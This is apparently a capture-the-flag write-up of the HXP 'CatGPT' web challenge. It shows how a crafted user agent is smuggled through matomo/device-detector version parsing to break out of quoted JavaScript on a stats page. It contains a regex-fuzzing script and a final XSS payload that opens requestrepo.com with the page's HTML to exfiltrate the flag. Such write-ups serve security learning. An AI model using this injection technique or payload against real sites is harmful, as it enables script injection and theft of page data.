# HXP
Contains all web writeups.

## CatGPT
In stats page, which contains the flag, the rows are added like this - 
```php
[... "<?= htmlspecialchars($row["os_name"]) . " " . $row["os_version"] ?>", "<?= htmlspecialchars($row["client_name"]) . " " . $row["client_version"] ?>",""]
```

We have raw injection in os_version and client version, but it has to be parsed by matomo/device-detector from user agents. The problem is version regexes are mostly limited to digits only. To escape and inject, we had three options - 

1. Inject a closing quote `"` and then add injection.
2. Inject `</script>` and then add another script element. The </script> will stop script even if its inside the quotes.
3. Inject a backslash, to escape the quote, thus exposing client_name.

Since there were a bit TOO much regexes for AI context, I instead, used this yaml parser and fuzzer to get possible injection in version matching regex groups.

```py
import os
import re
import yaml
import rstr
import sys

DANGEROUS_CHARS = ['"', '<', '>', "'", '\\', ';']

def clean_regex_for_python(regex):
    regex = regex.replace('(?i)', '')
    regex = regex.replace('(?s)', '')
    return regex

def get_regex_group(regex_pattern, group_index):
    current_group = 0
    i = 0
    length = len(regex_pattern)
    
    while i < length:
        char = regex_pattern[i]
        
        # Handle escapes
        if char == '\\':
            i += 2
            continue
            
        # Handle character classes [...] (ignore parens inside)
        if char == '[':
            i += 1
            while i < length:
                if regex_pattern[i] == '\\':
                    i += 2
                    continue
                if regex_pattern[i] == ']':
                    break
                i += 1
            i += 1
            continue
            
        if char == '(':
            is_capturing = True
            if i + 1 < length and regex_pattern[i+1] == '?':
                if i + 2 < length and regex_pattern[i+1:i+3] == '?P':
                    is_capturing = True # Named group
                else:
                    is_capturing = False
            
            if is_capturing:
                current_group += 1
                if current_group == group_index:
                    # Found the start of our group. Find the matching closing paren.
                    start_inner = i + 1
                    balance = 1
                    j = start_inner
                    while j < length:
                        if regex_pattern[j] == '\\':
                            j += 2
                            continue
                        if regex_pattern[j] == '[':
                            j += 1
                            while j < length:
                                if regex_pattern[j] == '\\':
                                    j += 2
                                    continue
                                if regex_pattern[j] == ']':
                                    break
                                j += 1
                            j += 1
                            continue
                            
                        if regex_pattern[j] == '(':
                            balance += 1
                        elif regex_pattern[j] == ')':
                            balance -= 1
                            if balance == 0:
                                return regex_pattern[start_inner:j]
                        j += 1
                    return None # Unbalanced
            
        i += 1
    return None

def analyze_file(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            # Load YAML safely
            data = yaml.safe_load(f)
    except Exception as e:
        # print(f"[-] Error loading {filepath}: {e}")
        return

    if not isinstance(data, list):
        return

    for entry in data:
        if not isinstance(entry, dict):
            continue

        regex_raw = entry.get('regex')
        version_format = entry.get('version')
        name = entry.get('name', 'Unknown')

        if not regex_raw:
            continue

        # Convert int/float version to string just in case
        if version_format is not None:
            version_format = str(version_format)

        # Look for $1, $2 etc in the version format string
        group_indices = []
        if version_format:
            matches = re.findall(r'\$(\d+)', version_format)
            group_indices = [int(m) for m in matches]
        
        if not group_indices:
            continue

        clean_regex = clean_regex_for_python(regex_raw)

        for idx in group_indices:
            sub_regex = get_regex_group(clean_regex, idx)
            
            if sub_regex:
                if re.fullmatch(r'[\d\.\[\]\+\-\*\?]+', sub_regex):
                    continue

                # Generate samples
                is_vuln = False
                vuln_sample = ""
                
                try:
                    for _ in range(10):
                        sample = rstr.xeger(sub_regex)
                        # Check for dangerous chars
                        if any(char in sample for char in DANGEROUS_CHARS):
                            is_vuln = True
                            vuln_sample = sample
                            break
                        if ' ' in sample:
                            pass
                except Exception:
                    # Regex might be too complex for rstr or invalid in Python re
                    continue

                if is_vuln:
                    print(f"\n[+] VULNERABLE REGEX FOUND!")
                    print(f"    File: {filepath}")
                    print(f"    Client Name: {name}")
                    print(f"    Full Regex: {regex_raw}")
                    print(f"    Target Group: ${idx}")
                    print(f"    Group Regex: {sub_regex}")
                    
def main():
    search_path = '.' 
    print(f"[*] Scanning {search_path} for vulnerable version regexes...")
    
    for root, dirs, files in os.walk(search_path):
        for file in files:
            if file.endswith('.yml'):
                analyze_file(os.path.join(root, file))

if __name__ == '__main__':
    main()
```

This wasn't sure shot ofc, i just was creating creating 10 random samples for each regex. But this gave me two regexes - 
```yaml
- regex: 'Pardus/(\d+.[\d.]+)'
  name: 'Pardus'
  version: '$1'

- regex: 'RokuOS/.+RokuOS (\d+.[\d.]+)'
  name: 'Roku OS'
  version: '$1'
```
In either of these, the . is unescaped, meaning we could inject a single stray character in it. But we need to follow it up with either a digit or a `.`. But it appeared as only loose regex, I dug into version parsing logic - 
```php
protected function buildVersion(string $versionString, array $matches): string
{
    $versionString = $this->buildByMatch($versionString, $matches);
    $versionString = \str_replace('_', '.', $versionString);

    if (self::VERSION_TRUNCATION_NONE !== static::$maxMinorParts
        && \substr_count($versionString, '.') > static::$maxMinorParts
    ) {
        $versionParts  = \explode('.', $versionString);
        $versionParts  = \array_slice($versionParts, 0, 1 + static::$maxMinorParts);
        $versionString = \implode('.', $versionParts);
    }

    return \trim($versionString, ' .');
}
```
The last line solves our issue, version parser strips any trailing slashes. Thus, we have escaped the quote, and exposed client_name. So now we need to find a regex that allows arbitrary stuff in client_name. This was much easier as there were only 5 regexes which had regex for client_name.

We choose - 
```yaml
- regex: '(?!AlohaBrowser)([^/;]*)/(\d+\.[\d.]+) \((?:iPhone|iPad); (?:iOS|iPadOS) [0-9.]+; Scale/[0-9.]+\)'
  name: '$1'
  version: '$2'
```

Now, the blacklisted chars in client_name are `^/;` from regex and `"'<>&'` from htmlspecialchars in PHP. This is a bit of problem as there is a stray closing quote after client_name. This syntax error cant be resolved until we have one more injection point. Looking into it a bit more, i saw this - 
```js
clientChart.setOption({
        title: {
            text: 'Client Name Distribution',
            left: 'center'
        },
        tooltip: tooltip,
        series: [{
            type: 'pie',
            radius: '60%',
            data: <?= json_encode($clientCount) ?>,
        }]
    });
```
clientCount contains all the unique client names, unescaped !!. So if we start a string in table rows with `` ` `` and end inside json_encode, we can expose raw payload.

Final payload looks like this. OS part -
```
RokuOS 12\.
```
Resulting in os_version as `12\`. And row looks like this - 
```js
["...", "Roku OS 12\", "<client_name> 3.1", ""]
```
Our client name - 
```
+`,<js_payload>]]})+({1:[{<!--
```

The starting `` +` `` just separates our from previous quote and start a new quote. This quote goes till json_encode and closes inside it - 

```js
`data: [{"name":"+`,<js_payload>]]})+({1:[{<!--","value":1}]
```

The `]]})` just close the already opened quotes and `+({1:[{` just opens tag for orphaned closing tags in below lines. Finally, we add `<!--` which basically comments out the leftover current line. Its equivalent to `//`. Thus, this results in parsable correct syntax, giving us js execution. 

Final user agent - 
```
+`, window.open(String.fromCharCode(47,47)+'requestrepo.com?a='+encodeURIComponent(document.body.innerHTML))]]})+({1:[{<!--/3.1.2 (iPhone; iOS 17.2; Scale/2.00) Mozilla/5.0 (shared; RokuOS/12.5.0) RokuOS 12\.
```
